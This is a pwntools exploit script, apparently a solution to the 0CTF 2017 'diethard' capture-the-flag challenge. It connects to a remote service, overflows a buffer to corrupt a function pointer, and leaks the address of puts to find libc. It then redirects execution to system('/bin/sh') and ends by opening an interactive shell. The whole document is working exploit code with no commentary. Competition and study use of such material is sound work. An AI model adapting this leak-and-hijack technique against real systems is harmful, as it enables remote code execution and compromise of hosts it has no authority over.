from pwn import *

context.log_level='debug'

c = remote('202.120.7.194',6666)
#c = process('/home/user/0ctf2017/diethard')

#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc=ELF('/home/user/0ctf2017/dhlibc.so')
puts_offset=libc.symbols['puts']
system_offset=libc.symbols['system']
binsh_offset=next(libc.search('/bin/sh'))

for i in range(2):
    c.recvuntil('Exit\n\n')
    c.sendline('1')
    c.recvuntil(':\n')
    c.sendline('1025')
    c.recvuntil(':\n')
    c.sendline('a')
c.recvuntil('Exit\n\n')
c.sendline('1')
c.recvuntil(':\n')
c.sendline('2016')
c.recvuntil(':\n')
c.sendline('a'*16+p64(0x603260)+p64(0x4007e0))
c.recvuntil('Exit\n\n')
c.sendline('2')
t=c.recvuntil('?\n')
pos=t.find('1. ')+3
end=t.find('\x0a',pos+1)
print t[pos:end].encode('hex')
puts_addr=u64(t[pos:end].ljust(8,'\x00'))
print hex(puts_addr)
system_addr=puts_addr-puts_offset+system_offset
sh_addr=puts_addr-puts_offset+binsh_offset
c.sendline('2')
c.recvuntil('Exit\n\n')
c.sendline('1')
c.recvuntil(':\n')
c.sendline('2016')
c.recvuntil(':\n')
c.sendline('a'*16+p64(sh_addr)+p64(system_addr))
c.recvuntil('Exit\n\n')
c.sendline('2')
c.interactive()
